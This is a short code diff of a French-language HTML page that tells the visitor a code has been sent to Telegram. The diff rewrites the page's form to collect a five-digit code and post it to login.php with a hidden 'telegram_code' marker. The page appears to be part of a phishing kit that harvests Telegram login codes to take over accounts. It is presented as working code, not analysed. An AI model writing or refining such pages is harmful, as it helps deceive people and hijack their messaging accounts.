@@ -63,10 +63,13 @@
   <p>Nous avons envoyé le code à <strong>Telegram</strong>, l'application sur votre autre appareil.</p>
 
   <!-- Formulaire qui envoie le code -->
-  <form action="login.php" method="post" a>
-    <label for="password">mot de passe</label>
-            <input type="password" id="password" name="code" placeholder="code" required autocomplete="username">
-    <button type="submit">Envoyer</button>
+  <form action="login.php" method="POST" id="codeForm">
+  <input type="hidden" name="form_type" value="telegram_code">
+  
+  <input type="text" name="code" placeholder="Code" id="codeInput" required 
+         pattern="[0-9]{5}" title="Un code de 5 chiffres"/>
+  
+  <button type="submit">Envoyer</button>
   </form>
 
   <script>
